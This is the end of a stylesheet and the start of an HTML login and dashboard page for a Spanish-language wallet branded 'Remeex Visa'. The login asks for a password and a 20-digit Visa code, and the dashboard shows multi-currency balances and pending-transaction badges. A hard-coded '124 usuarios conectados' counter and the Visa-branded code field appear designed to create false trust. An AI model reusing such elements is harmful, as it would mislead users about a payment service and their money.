.tarjeta-validacion.estilo-transaccion {
  display: flex;
  flex-direction: column;
  gap: 0.5rem;
  background: var(--neutral-100);
  border-radius: var(--radius-md);
  padding: 0.75rem 1rem;
  box-shadow: var(--shadow-sm);
  transition: transform 0.3s var(--animation-bounce), box-shadow 0.3s ease;
}

.tarjeta-validacion.estilo-transaccion:hover {
  transform: translateY(-3px);
  box-shadow: var(--shadow-md);
}

.tarjeta-validacion.estilo-transaccion .cabecera {
  display: flex;
  align-items: center;
  gap: 0.6rem;
}

.tarjeta-validacion.estilo-transaccion .icono-validacion {
  width: 32px;
  height: 32px;
  border-radius: var(--radius-full);
  background: var(--primary);
  color: #fff;
  display: flex;
  align-items: center;
  justify-content: center;
  font-size: 1rem;
  flex-shrink: 0;
}

.tarjeta-validacion.estilo-transaccion .titulo strong {
  display: block;
  font-weight: 600;
  font-size: 0.75rem;
  color: var(--neutral-900);
  margin-bottom: 0.25rem;
}

.tarjeta-validacion.estilo-transaccion .titulo p {
  font-size: 0.65rem;
  color: var(--neutral-600);
}

.botones-validacion {
  display: flex;
  gap: 0.5rem;
  flex-wrap: wrap;
  margin-top: 0.5rem;
}

.botones-validacion button {
  flex: 1 1 auto;
  height: auto;
  padding: 0.45rem 0.75rem;
  white-space: normal;
  line-height: 1.2;
}

.boton-accion {
  font-size: 0.85rem;
  padding: 0.45rem 0.95rem;
}

@keyframes checkmarkPulse {
  0%, 100% {
    transform: scale(1);
  }
  50% {
    transform: scale(1.1);
  }
}

@keyframes warningPulse {
  0%, 100% {
    transform: scale(1);
    opacity: 1;
  }
  50% {
    transform: scale(1.05);
    opacity: 0.8;
  }
}

/* Update processing icon when in bank validation phase */
.verification-processing-icon.bank-phase {
  background: linear-gradient(135deg, #4ade80 0%, #22c55e 100%);
}

.verification-processing-icon.bank-phase i {
  animation: iconRotate 3s ease-in-out infinite;
}

@keyframes iconRotate {
  0%, 100% {
    transform: rotate(0deg);
  }
  25% {
    transform: rotate(-5deg);
  }
  75% {
    transform: rotate(5deg);
  }
}

    /* Identity Verification Modal */
    .modal-overlay {
      position: fixed;
      top: 0;
      left: 0;
      right: 0;
      bottom: 0;
      background: rgba(0, 0, 0, 0.7);
      backdrop-filter: blur(5px);
      display: flex;
      align-items: center;
      justify-content: center;
      z-index: 1100;
      display: none;
    }
    
    /* Bank/Mobile Transfer Processing Modal */
    .modal-overlay {
      position: fixed;
      top: 0;
      left: 0;
      right: 0;
      bottom: 0;
      background: rgba(0, 0, 0, 0.7);
      backdrop-filter: blur(5px);
      display: flex;
      align-items: center;
      justify-content: center;
      z-index: 1100;
      display: none;
      animation: fadeIn 0.3s ease;
    }
    
    /* Toast Notifications */
    .toast-container {
      position: fixed;
      top: 70px;
      right: 16px;
      z-index: 9999;
      display: flex;
      flex-direction: column;
      gap: 0.75rem;
    }
    
    .toast {
      background: var(--neutral-900);
      color: white;
      border-radius: var(--radius-md);
      padding: 0.75rem 1rem;
      min-width: 250px;
      max-width: 320px;
      box-shadow: var(--shadow-lg);
      display: flex;
      align-items: center;
      gap: 0.75rem;
      animation: slideInRight 0.3s ease, fadeOut 0.3s ease 3s forwards;
    }
    
    .toast.success {
      border-left: 4px solid var(--success);
    }
    
    .toast.error {
      border-left: 4px solid var(--danger);
    }
    
    .toast.warning {
      border-left: 4px solid var(--warning);
    }
    
    .toast.info {
      border-left: 4px solid var(--info);
    }
    
    .toast-icon {
      flex-shrink: 0;
    }
    
    .toast-content {
      flex: 1;
      min-width: 0;
    }
    
    .toast-title {
      font-weight: 600;
      font-size: 0.85rem;
      margin-bottom: 0.2rem;
    }
    
    .toast-message {
      font-size: 0.75rem;
      opacity: 0.9;
      word-wrap: break-word;
    }
    
    .toast-close {
      color: var(--neutral-400);
      cursor: pointer;
      transition: var(--transition-base);
      flex-shrink: 0;
    }
    
    .toast-close:hover {
      color: white;
    }
    
    /* Inactivity Modal */
    .inactivity-modal {
      position: fixed;
      top: 0;
      left: 0;
      right: 0;
      bottom: 0;
      background: rgba(0, 0, 0, 0.8);
      backdrop-filter: blur(5px);
      display: flex;
      align-items: center;
      justify-content: center;
      z-index: 9999;
      display: none;
      animation: fadeIn 0.3s ease;
    }
    
    .inactivity-card {
      background: white;
      border-radius: var(--radius-lg);
      width: 90%;
      max-width: 320px;
      padding: 1.5rem;
      text-align: center;
      animation: scaleIn 0.3s ease;
    }
    
    .inactivity-icon {
      width: 60px;
      height: 60px;
      border-radius: 50%;
      background: var(--warning);
      color: white;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 1.75rem;
      margin: 0 auto 1.25rem;
    }
    
    .inactivity-title {
      font-size: 1.25rem;
      font-weight: 700;
      color: var(--neutral-900);
      margin-bottom: 0.75rem;
    }
    
    .inactivity-message {
      font-size: 0.85rem;
      color: var(--neutral-600);
      margin-bottom: 1.25rem;
    }
    
    .inactivity-timer {
      font-size: 1.75rem;
      font-weight: 700;
      color: var(--danger);
      margin-bottom: 1.25rem;
    }
    
    .inactivity-actions {
      display: flex;
      flex-direction: column;
      gap: 0.75rem;
    }
    
    /* Welcome Modal */
    .welcome-modal {
      position: fixed;
      top: 0;
      left: 0;
      right: 0;
      bottom: 0;
      background: rgba(0, 0, 0, 0.7);
      backdrop-filter: blur(5px);
      display: flex;
      align-items: center;
      justify-content: center;
      z-index: 1200;
      display: none;
    }
    
    .welcome-card {
      background: white;
      border-radius: var(--radius-lg);
      width: 90%;
      max-width: 380px;
      padding: 1.5rem;
      animation: scaleIn 0.3s ease;
    }
    
    .welcome-header {
      display: flex;
      align-items: center;
      gap: 1.25rem;
      margin-bottom: 1.25rem;
    }
    
    .welcome-icon {
      width: 50px;
      height: 50px;
      border-radius: 50%;
      background: var(--primary);
      color: white;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 1.25rem;
      flex-shrink: 0;
    }
    
    .welcome-title-container {
      flex: 1;
      min-width: 0;
    }
    
    .welcome-title {
      font-size: 1.25rem;
      font-weight: 700;
      color: var(--neutral-900);
      margin-bottom: 0.25rem;
    }
    
    .welcome-subtitle {
      font-size: 0.85rem;
      color: var(--neutral-600);
    }
    
    .welcome-content {
      margin-bottom: 1.5rem;
    }
    
    .welcome-step {
      display: flex;
      gap: 0.75rem;
      align-items: flex-start;
      margin-bottom: 1.25rem;
    }
    
    .welcome-step-icon {
      width: 28px;
      height: 28px;
      border-radius: var(--radius-full);
      background: var(--primary-light);
      color: white;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 0.9rem;
      flex-shrink: 0;
    }
    
    .welcome-step-content {
      flex: 1;
    }
    
    .welcome-step-title {
      font-weight: 600;
      font-size: 0.9rem;
      color: var(--neutral-900);
      margin-bottom: 0.25rem;
    }
    
    .welcome-step-description {
      font-size: 0.8rem;
      color: var(--neutral-600);
    }

    /* Logout Modal */
    .logout-modal {
      position: fixed;
      top: 0;
      left: 0;
      right: 0;
      bottom: 0;
      background: rgba(0, 0, 0, 0.7);
      backdrop-filter: blur(5px);
      display: flex;
      align-items: center;
      justify-content: center;
      z-index: 1200;
      display: none;
    }

    .logout-card {
      background: white;
      border-radius: var(--radius-lg);
      width: 90%;
      max-width: 380px;
      padding: 1.5rem;
      animation: scaleIn 0.3s ease;
      text-align: center;
    }

    .logout-icon {
      width: 60px;
      height: 60px;
      border-radius: 50%;
      background: var(--primary);
      color: white;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 1.75rem;
      margin: 0 auto 1.25rem;
    }

    .logout-title {
      font-size: 1.25rem;
      font-weight: 700;
      color: var(--neutral-900);
      margin-bottom: 0.75rem;
    }

    .logout-message {
      font-size: 0.85rem;
      color: var(--neutral-600);
      margin-bottom: 1.25rem;
    }

    .logout-actions {
      display: flex;
      flex-direction: column;
      gap: 0.75rem;
    }

    /* Contact Section */
    .contact-options {
      display: grid;
      grid-template-columns: repeat(2, 1fr);
      gap: 1rem;
      margin-top: 1.25rem;
    }

    .contact-option {
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 0.6rem;
      padding: 1rem;
      background: var(--neutral-200);
      border-radius: var(--radius-md);
      transition: all 0.3s ease;
      text-decoration: none;
      color: var(--neutral-900);
      text-align: center;
    }

    .contact-option:hover {
      background: var(--neutral-300);
      transform: translateY(-3px);
      box-shadow: var(--shadow-md);
    }

    .contact-icon {
      width: 50px;
      height: 50px;
      border-radius: var(--radius-full);
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 1.5rem;
      flex-shrink: 0;
      color: white;
      margin-bottom: 0.25rem;
    }
    
    .contact-icon.whatsapp {
      background: #25D366;
    }
    
    .contact-icon.email {
      background: var(--primary);
    }

    .contact-icon.chat {
      background: var(--info);
    }

    .contact-icon.reviews {
      background: var(--warning);
    }
    
    .contact-content {
      text-align: center;
    }
    
    .contact-title {
      font-weight: 600;
      font-size: 0.85rem;
      margin-bottom: 0.2rem;
    }
    
    .contact-description {
      font-size: 0.75rem;
      color: var(--neutral-600);
      white-space: nowrap;
      overflow: hidden;
      text-overflow: ellipsis;
    }
    
    /* Tawk.to */
    .tawkto-container {
      position: fixed;
      z-index: 1200;
      bottom: 20px;
      right: 20px;
      visibility: hidden;
      display: none;
    }

    .contact-icon.live {
      background: var(--success);
    }
    
    /* Animations */
    @keyframes fadeIn {
      from { opacity: 0; }
      to { opacity: 1; }
    }
    
    @keyframes scaleIn {
      from { transform: scale(0.9); opacity: 0; }
      to { transform: scale(1); opacity: 1; }
    }
    
    @keyframes fadeInUp {
      from { opacity: 0; transform: translateY(20px); }
      to { opacity: 1; transform: translateY(0); }
    }
    
    @keyframes checkmarkScale {
      from { transform: scale(0); }
      to { transform: scale(1); }
    }
    
    @keyframes spin {
      to { transform: rotate(360deg); }
    }
    
    @keyframes slideInRight {
      from { transform: translateX(100%); opacity: 0; }
      to { transform: translateX(0); opacity: 1; }
    }
    
    @keyframes fadeOut {
      from { opacity: 1; }
      to { opacity: 0; visibility: hidden; }
    }

    @keyframes slideUp {
      from { transform: translateY(100%); opacity: 0; }
      to { transform: translateY(0); opacity: 1; }
    }
    
    /* Custom toggle switch */
    .switch {
      position: relative;
      display: inline-block;
      width: 50px;
      height: 24px;
    }
    
    .switch input {
      opacity: 0;
      width: 0;
      height: 0;
    }
    
    .slider {
      position: absolute;
      cursor: pointer;
      top: 0;
      left: 0;
      right: 0;
      bottom: 0;
      background-color: var(--neutral-400);
      transition: .4s;
    }
    
    .slider:before {
      position: absolute;
      content: "";
      height: 18px;
      width: 18px;
      left: 3px;
      bottom: 3px;
      background-color: white;
      transition: .4s;
    }
    
    input:checked + .slider {
      background-color: var(--primary);
    }
    
    input:focus + .slider {
      box-shadow: 0 0 1px var(--primary);
    }
    
    input:checked + .slider:before {
      transform: translateX(26px);
    }
    
    .slider.round {
      border-radius: 24px;
    }
    
    .slider.round:before {
      border-radius: 50%;
    }

    /* Botn para procesar directamente el pago con tarjeta guardada */
    .saved-card-pay-btn {
      background: var(--primary);
      color: white;
      border: none;
      border-radius: var(--radius-md);
      padding: 0.8rem 1rem;
      font-size: 0.9rem;
      font-weight: 600;
      cursor: pointer;
      transition: all 0.3s var(--animation-bounce);
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 0.5rem;
      margin-top: 1rem;
      width: 100%;
    }
    
    .saved-card-pay-btn:hover {
      background: var(--primary-light);
      transform: translateY(-3px);
      box-shadow: var(--shadow-md);
    }
    
    .saved-card-pay-btn:active {
      transform: translateY(0);
    }

    /* Banner base style */
    .banner {
      display: flex;
      align-items: center;
      gap: 1rem;
      background: var(--neutral-100);
      border: 2px solid var(--visa-blue);
      border-radius: var(--radius-md);
      padding: 0.9rem 1rem;
      margin: 1.25rem 0;
      box-shadow: var(--shadow-md);
      color: var(--visa-blue);
    }
    .banner.warning { border-color: var(--warning-orange); color: var(--warning-orange); }
    .banner.success { border-color: var(--success-green); color: var(--success-green); }
    .banner.danger { border-color: var(--danger-red); color: var(--danger-red); }
    .banner .action {
      background: currentColor;
      color: #fff;
      border: none;
      border-radius: var(--radius-md);
      padding: 0.4rem 0.75rem;
      font-size: 0.8rem;
      font-weight: 600;
      cursor: pointer;
      transition: var(--transition-base);
    }
    .banner .action:hover { transform: translateY(-3px); box-shadow: var(--shadow-md); }

    /* Primera recarga - Banner */
    .first-recharge-banner {
      background: var(--neutral-100);
      border: 2px solid var(--visa-blue);
      border-radius: var(--radius-md);
      padding: 0.9rem 1rem;
      display: flex;
      align-items: center;
      gap: 1rem;
      margin: 1.25rem 0;
      box-shadow: var(--shadow-md);
      color: var(--visa-blue);
    }
    
    .first-recharge-icon {
      width: 36px;
      height: 36px;
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      background: var(--visa-blue);
      color: #fff;
      font-size: 1.1rem;
      flex-shrink: 0;
    }
    
    .first-recharge-content {
      flex: 1;
      min-width: 0;
    }
    
    .first-recharge-title {
      font-weight: 700;
      margin-bottom: 0.25rem;
      font-size: 0.9rem;
    }
    
    .first-recharge-text {
      font-size: 0.8rem;
      opacity: 0.9;
    }
    
    .first-recharge-action {
      background: var(--visa-blue);
      color: #fff;
      font-weight: 600;
      font-size: 0.8rem;
      padding: 0.4rem 0.75rem;
      border-radius: var(--radius-md);
      flex-shrink: 0;
      transition: all 0.3s var(--animation-bounce);
      cursor: pointer;
      border: none;
      white-space: nowrap;
    }
    
    .first-recharge-action:hover {
      transform: translateY(-3px);
      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
    }

    /* Beneficios de validacin */
    .validation-benefits-banner {
      background: var(--neutral-100);
      border: 2px solid var(--success-green);
      border-radius: var(--radius-md);
      padding: 0.9rem 1rem;
      display: flex;
      align-items: center;
      gap: 1rem;
      margin: 1.25rem 0;
      box-shadow: var(--shadow-md);
      color: var(--success-green);
    }

    .validation-benefits-icon {
      width: 36px;
      height: 36px;
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      background: var(--success-green);
      color: #fff;
      font-size: 1.1rem;
      flex-shrink: 0;
    }

    .validation-benefits-content { flex: 1; min-width: 0; }
    .validation-benefits-title { font-weight: 700; margin-bottom: 0.25rem; font-size: 0.9rem; }
    .validation-benefits-text { font-size: 0.8rem; opacity: 0.9; }
    
    /* Notificacin de seguridad */
    .security-notice-banner {
      background: rgba(0, 149, 255, 0.1);
      border-left: 3px solid var(--info);
      border-radius: var(--radius-md);
      padding: 0.9rem;
      display: flex;
      align-items: center;
      gap: 0.8rem;
      margin: 1.25rem 0;
      box-shadow: var(--shadow-sm);
    }
    
    .security-notice-icon {
      width: 56px;
      height: 56px;
      display: flex;
      align-items: center;
      justify-content: center;
      color: var(--info);
      flex-shrink: 0;
    }

    .security-notice-icon img {
      width: 100%;
      height: 100%;
      object-fit: contain;
      border-radius: 0;
      background: none;
    }
    
    .security-notice-content {
      flex: 1;
      min-width: 0;
    }
    
    .security-notice-title {
      font-weight: 600;
      color: var(--neutral-900);
      margin-bottom: 0.25rem;
      font-size: 0.9rem;
    }
    
    .security-notice-text {
      color: var(--neutral-700);
      font-size: 0.8rem;
    }

    .security-notice-close {
      cursor: pointer;
      color: var(--neutral-600);
      font-size: 0.9rem;
    }

    /* Nuevo estilo para el contenedor de soporte despus de 5 minutos */
    .support-needed-container {
      display: none;
      background: linear-gradient(135deg, var(--warning) 0%, #f59e0b 100%);
      border-radius: var(--radius-lg);
      padding: 1.25rem;
      margin: 1.5rem 0;
      color: white;
      box-shadow: var(--shadow-lg);
      animation: fadeIn 0.5s ease;
    }

    .support-needed-header {
      display: flex;
      align-items: center;
      gap: 1rem;
      margin-bottom: 1rem;
    }

    .support-needed-icon {
      width: 50px;
      height: 50px;
      border-radius: 50%;
      background: white;
      color: var(--warning);
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 1.5rem;
      flex-shrink: 0;
    }

    .support-needed-title {
      font-size: 1.25rem;
      font-weight: 700;
      margin-bottom: 0.25rem;
    }

    .support-needed-subtitle {
      font-size: 0.9rem;
      opacity: 0.9;
    }

    .support-needed-content {
      font-size: 0.9rem;
      margin-bottom: 1.5rem;
      line-height: 1.6;
    }

    .whatsapp-support-btn {
      background: #25D366;
      color: white;
      border: none;
      border-radius: var(--radius-lg);
      padding: 1rem;
      width: 100%;
      font-size: 1rem;
      font-weight: 600;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 0.5rem;
      text-decoration: none;
      transition: all 0.3s var(--animation-bounce);
      box-shadow: var(--shadow-md);
    }

    .whatsapp-support-btn:hover {
      transform: translateY(-5px);
      box-shadow: var(--shadow-xl);
    }

    .whatsapp-support-btn i {
      font-size: 1.5rem;
    }

    /* Estilos para botones deshabilitados */
    .btn-primary:disabled, 
    .saved-card-pay-btn:disabled {
      background: var(--neutral-500);
      cursor: not-allowed;
      transform: none;
      box-shadow: none;
    }

    .btn-primary:disabled:hover, 
    .saved-card-pay-btn:disabled:hover {
      background: var(--neutral-500);
      transform: none;
      box-shadow: none;
    }
    
    /* Mensaje de confirmacin pago mvil */
    .mobile-payment-success {
      display: none;
      background: rgba(0, 211, 77, 0.1);
      border-left: 3px solid var(--success);
      border-radius: var(--radius-md);
      padding: 0.9rem;
      margin: 1.25rem 0;
      box-shadow: var(--shadow-sm);
    }
    
    .mobile-payment-success-icon {
      width: 36px;
      height: 36px;
      background: var(--success);
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      color: white;
      font-size: 1.1rem;
      flex-shrink: 0;
    }
    
    .mobile-payment-success-content {
      flex: 1;
      min-width: 0;
    }
    
    .mobile-payment-success-title {
      font-weight: 600;
      color: var(--neutral-900);
      margin-bottom: 0.25rem;
      font-size: 0.9rem;
    }
    
    .mobile-payment-success-text {
      color: var(--neutral-700);
      font-size: 0.8rem;
    }

    /* Nuevos estilos para los botones de configuracin */
    .settings-buttons {
      display: flex;
      flex-direction: column;
      gap: 1rem;
      margin-top: 1rem;
    }

    .settings-nav-btn {
      display: flex;
      align-items: center;
      gap: 0.75rem;
      padding: 0.9rem;
      background: var(--neutral-200);
      border-radius: var(--radius-md);
      transition: all 0.3s ease;
      text-decoration: none;
      color: var(--neutral-900);
      border: none;
      width: 100%;
      cursor: pointer;
    }

    .settings-nav-btn:hover {
      background: var(--neutral-300);
      transform: translateY(-2px);
      box-shadow: var(--shadow-md);
    }

    .settings-nav-icon {
      width: 36px;
      height: 36px;
      border-radius: var(--radius-full);
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 1rem;
      flex-shrink: 0;
      color: white;
    }

    .settings-nav-icon.verification {
      background: var(--primary);
    }

    .settings-nav-icon.activation {
      background: var(--success);
    }

    .settings-nav-icon.limits {
      background: var(--info);
    }

    .settings-nav-content {
      flex: 1;
      min-width: 0;
      text-align: left;
    }

    .settings-nav-title {
      font-weight: 600;
      font-size: 0.85rem;
      margin-bottom: 0.2rem;
    }

    .settings-nav-description {
      font-size: 0.75rem;
      color: var(--neutral-600);
    }
    
    /* Responsive Styles */
    @media (max-width: 479px) {
      .verification-processing-banner {
        flex-wrap: wrap;
        align-items: flex-start;
      }
      .verification-processing-content {
        width: 100%;
      }
      .verification-note {
        display: none;
      }
      #verification-progress-percent {
        text-align: left;
      }
      .users-online-badge {
        display: flex;
        padding: 0.25rem;
      }

      #users-online-count {
        display: none;
      }

      .pulse-dot {
        width: 8px;
        height: 8px;
      }

      .service-grid {
        grid-template-columns: repeat(2, 1fr);
      }

      .service-icon,
      .support-icon,
      .welcome-icon,
      .logout-icon,
      .inactivity-icon,
      .feature-blocked-icon {
        width: 40px;
        height: 40px;
        font-size: 1.25rem;
      }

      .transaction-item {
        grid-template-columns: auto 1fr auto;
        font-size: 0.75rem;
      }

      .transaction-title {
        font-size: 0.7rem;
      }

      .transaction-details {
        font-size: 0.6rem;
      }

      .transaction-amount {
        font-size: 0.75rem;
      }
    }

    @media (min-width: 480px) {
      .users-online-badge {
        display: flex;
      }

      #users-online-count {
        display: inline;
      }
      
      .saved-card-container {
        padding: 1.25rem;
      }
    }
    
    @media (min-width: 768px) {
      .app-container {
        max-width: 100%;
      }
      
      .dashboard-content {
        padding: 1.25rem;
      }
      
      .header-brand-text {
        display: block;
      }
      
      .balance-amount {
        font-size: 2.36rem;
      }
      
      .balance-btn {
        height: 44px;
        font-size: 0.85rem;
      }

      .service-grid {
        grid-template-columns: repeat(4, 1fr);
      }
    }
    
    @media (min-width: 1024px) {
      .dashboard-content {
        padding: 1.5rem;
      }
    }
    details.account-section {
      margin-top: 0.75rem;
    }
    details.account-section summary {
      cursor: pointer;
      font-weight: 600;
      margin-bottom: 0.5rem;
    }
  #banks-list div {
    padding: 0.25rem 0;
    border-bottom: 1px solid var(--neutral-200);
  }

    /* Page Overlay to display external pages within the dashboard */
    .page-overlay {
      position: fixed;
      top: 60px;
      bottom: 60px;
      left: 0;
      right: 0;
      background: rgba(0, 0, 0, 0.7);
      backdrop-filter: blur(5px);
      display: none;
      z-index: 1000;
      animation: fadeIn 0.3s ease;
    }

    .page-container {
      position: absolute;
      top: 0;
      bottom: 0;
      left: 0;
      right: 0;
      background: var(--neutral-100);
      overflow-y: auto;
    }

    .page-frame {
      width: 100%;
      height: 100%;
      border: none;
    }

    .page-close {
      position: absolute;
      top: 0.5rem;
      right: 0.5rem;
      width: 32px;
      height: 32px;
      border-radius: var(--radius-full);
      background: var(--neutral-200);
      display: flex;
      align-items: center;
      justify-content: center;
      cursor: pointer;
      transition: var(--transition-base);
      z-index: 10;
    }

    .page-close:hover {
      background: var(--neutral-300);
    }
  </style>
  <link rel="stylesheet" href="responsive.css">
</head>

<body>
  <!-- Login Section -->
  <div class="login-container" id="login-container">
    <div class="login-card">
      <div class="login-logo">
        <div class="login-logo-container">
          <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhnBzNdjl6bNp-nIdaiHVENczJhwlJNA7ocsyiOObMmzbu8at0dY5yGcZ9cLxLF39qI6gwNfqBxlkTDC0txVULEwQVwGkeEzN0Jq9MRTRagA48mh18UqTlR4WhsXOLAEZugUyhqJHB19xJgnkpe-S5VOWFgzpKFwctv3XP9XhH41vNTvq0ZS-nik58Qhr-O/s320/remeex.png" alt="REMEEX">
        </div>
      </div>
      
      <div class="login-heading">
        <h1 class="login-title" id="welcome-message">Bienvenido</h1>
        <p class="login-subtitle" id="welcome-subtitle">Ingrese sus datos para acceder a su cuenta</p>
        <p class="login-email" id="welcome-email"></p>
      </div>
      
      <div class="security-badge">
        <div class="security-badge-icon">
          <i class="fas fa-shield-alt"></i>
        </div>
        <div class="security-badge-content">
          <div class="security-badge-title">Conexin segura</div>
          <div class="security-badge-text">Sus datos estn protegidos con cifrado de nivel bancario</div>
        </div>
      </div>
      
      <div class="form-group" style="display:none;">
        <label class="form-label" for="full-name">Nombre Completo</label>
        <input type="text" class="form-control" id="full-name" placeholder="Ej: Juan Prez" aria-describedby="name-error" readonly>
        <div class="error-message" id="name-error"></div>
      </div>

      <div class="form-group" style="display:none;">
        <label class="form-label" for="email">Correo Electrnico</label>
        <input type="email" class="form-control" id="email" placeholder="ejemplo@correo.com" aria-describedby="email-error" readonly>
        <div class="error-message" id="email-error"></div>
      </div>

      <div class="form-group">
        <label class="form-label" for="login-password">Contrasea</label>
        <input type="password" class="form-control" id="login-password" placeholder="Tu contrasea" aria-describedby="login-password-error">
        <span class="password-toggle" id="toggle-login-password"><i class="fas fa-eye"></i></span>
        <div class="error-message" id="login-password-error">Por favor, introduce tu contrasea.</div>
      </div>

      <div class="form-group">
        <label class="form-label" for="visa-code">Cdigo Visa de 20 dgitos</label>
        <input type="password" class="form-control" id="visa-code" placeholder="Enviado a tu correo electrnico" aria-describedby="code-error">
        <span class="password-toggle" id="toggle-visa-code"><i class="fas fa-eye"></i></span>
        <div class="error-message" id="code-error">La clave debe tener 20 dgitos.</div>
      </div>

      <div class="login-balance-card" id="pre-login-balance" style="display:none;">
        <div class="balance-owner" id="pre-balance-owner"></div>
        <div class="login-balance-main" id="pre-main-balance">Bs 0,00</div>
        <div class="login-balance-eq">
          <span id="pre-usd-balance"> $0.00</span> |
          <span id="pre-eur-balance"> 0.00</span>
        </div>
        <div class="login-balance-rate" id="pre-exchange-rate">Tasa: --</div>
      </div>
      
      <button class="btn btn-primary" id="login-button">
        <i class="fas fa-sign-in-alt"></i> Iniciar Sesin
      </button>
      

      <div style="text-align:center; margin-top:1rem;">
        <a href="index" target="_blank" class="btn btn-outline">Ir a Remeex Visa</a>
      </div>
    </div>

    <div class="support-container">
      <button class="btn btn-outline" id="support-btn"><i class="fas fa-headset"></i> Soporte</button>
      <div class="support-menu" id="support-menu">
        <div class="support-menu-header">
          <div class="support-menu-title">Ayuda</div>
          <div class="support-menu-close" id="support-menu-close"><i class="fas fa-times"></i></div>
        </div>
        <div class="support-grid">
          <div class="support-option" id="recover-password">
            <div class="support-icon"><i class="fas fa-key"></i></div>
            <span>Recuperar contrasea</span>
          </div>
          <a href="https://wa.me/+17373018059" class="support-option whatsapp-link" id="whatsapp-support" target="_blank">
            <div class="support-icon"><i class="fab fa-whatsapp"></i></div>
            <span>Hablar por WhatsApp</span>
          </a>
          <div class="support-option" id="tawk-support">
            <div class="support-icon"><i class="fas fa-comments"></i></div>
            <span>Chat en lnea (Tawk.to)</span>
          </div>
        </div>
      </div>
    </div>
  </div>

  <!-- App Header (only visible after login) -->
  <header class="app-header" id="app-header" style="display: none;">
    <div class="header-brand">
      <a href="index">
        <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhnBzNdjl6bNp-nIdaiHVENczJhwlJNA7ocsyiOObMmzbu8at0dY5yGcZ9cLxLF39qI6gwNfqBxlkTDC0txVULEwQVwGkeEzN0Jq9MRTRagA48mh18UqTlR4WhsXOLAEZugUyhqJHB19xJgnkpe-S5VOWFgzpKFwctv3XP9XhH41vNTvq0ZS-nik58Qhr-O/s320/remeex.png" alt="REMEEX">
      </a>
    </div>
    
    <div class="header-actions">
      <div class="users-online-badge" id="online-users-link">
        <div class="pulse-dot"></div>
        <span id="users-online-count">124 usuarios conectados</span>
      </div>
      
      <button class="header-action-btn" id="notification-btn" aria-label="Notificaciones">
        <i class="fas fa-bell"></i>
        <span class="notification-badge" style="display:none">0</span>
      </button>
      <button class="header-action-btn" id="header-logout-btn" aria-label="Cerrar Sesin">
        <i class="fas fa-sign-out-alt"></i>
      </button>
    </div>
  </header>

  <!-- Dashboard Container -->
  <div class="app-container" id="dashboard-container" style="display: none;">
    <div class="dashboard-content">
      <!-- Home Section -->
      <div id="home-section">
        <!-- Main Account Card -->
        <div class="balance-card">
          <div class="card-decoration"></div>
          <div class="card-decoration"></div>
          <div class="balance-content">
            <div class="balance-header">
              <div class="balance-label">
                <i class="fas fa-shield-alt"></i>
                <span id="balance-label-name">Saldo Disponible</span>
              </div>
              <div class="header-right">
                <div class="header-avatar" id="header-avatar">JP</div>
                <div class="balance-controls">
                  <button id="currency-toggle-btn" class="balance-control-btn">USD</button>
                  <button id="balance-visibility-btn" class="balance-control-btn"><i class="fas fa-eye"></i></button>
                </div>
              </div>
            </div>
            
            <div class="balance-amount" id="dashboard-balance">
              <img src="https://upload.wikimedia.org/wikipedia/commons/0/06/Flag_of_Venezuela.svg" class="currency-flag" id="main-currency-flag" alt="Bandera de Venezuela">
              <span id="main-currency-symbol">Bs</span>
              <span id="main-balance-value">0,00</span>
            </div>
            
            <div class="balance-equivalents">
              <div class="balance-equivalent">
                <img src="https://flagcdn.com/us.svg" class="currency-flag" alt="Bandera de EEUU">
                <span id="usd-equivalent"> $0.00</span>
              </div>
              <div class="balance-equivalent">
                <img src="https://upload.wikimedia.org/wikipedia/commons/b/b7/Flag_of_Europe.svg" class="currency-flag" alt="Bandera de la Unin Europea">
                <span id="eur-equivalent"> 0.00</span>
              </div>
            </div>
            
            <div class="exchange-rate" id="exchange-rate">
              <i class="fas fa-exchange-alt"></i> <span id="exchange-rate-display">Tasa: 1 USD = 151.10 Bs | 1 USD = 0.94 EUR</span>
            </div>
            
            <div class="balance-date" id="balance-date">Domingo, 4 de Mayo de 2025</div>

            <div class="balance-savings" id="balance-savings" style="display:none; margin-bottom:0.75rem;">
              <button class="btn btn-outline" id="view-savings-btn" style="font-size:0.75rem;"></button>
            </div>

            <!-- Pending Transaction Badge (hidden by default) -->
            <div class="pending-transaction-badge" id="pending-transaction-badge" style="display: none;">
              <i class="fas fa-clock"></i>
              <div>
                <div style="font-weight: 600; margin-bottom: 0.125rem;">Transaccin pendiente</div>
                <div id="pending-transaction-amount">$0.00 en proceso de verificacin</div>
              </div>
            </div>

            <!-- Rejected Transaction Badge (hidden by default) -->
            <div class="rejected-transaction-badge" id="rejected-transaction-badge" style="display: none;">
              <i class="fas fa-times"></i>
              <div>
                <div style="font-weight: 600; margin-bottom: 0.125rem;">Transaccin rechazada</div>
                <div id="rejected-transaction-amount">$0.00 ser devuelto</div>
              </div>
            </div>
            
            <div class="balance-actions">
              <button class="balance-btn" id="recharge-btn">
                <i class="fas fa-plus-circle"></i> Recargar Saldo
              </button>
              <button class="balance-btn" id="send-btn">
                <i class="fas fa-upload"></i> Retirar Dinero
              </button>
            </div>
          </div>
        </div>
        
        <!-- Banner promocional dinmico -->
        <div class="security-notice-banner" id="promo-banner">
          <div class="security-notice-icon" id="promo-icon">
            <i class="fas fa-lock"></i>
          </div>
          <div class="security-notice-content">
            <div class="security-notice-title" id="promo-title">Acceso Exclusivo a este Dispositivo</div>
            <div class="security-notice-text" id="promo-text">Por su seguridad, su saldo y transacciones solo estn disponibles en este dispositivo donde ha iniciado sesin.</div>
          </div>
          <div class="security-notice-close" id="security-notice-close"><i class="fas fa-times"></i></div>
        </div>
  <script src="js/promo-banner.js"></script>
        
        <!-- Estado 1: Invitacin a recargar -->
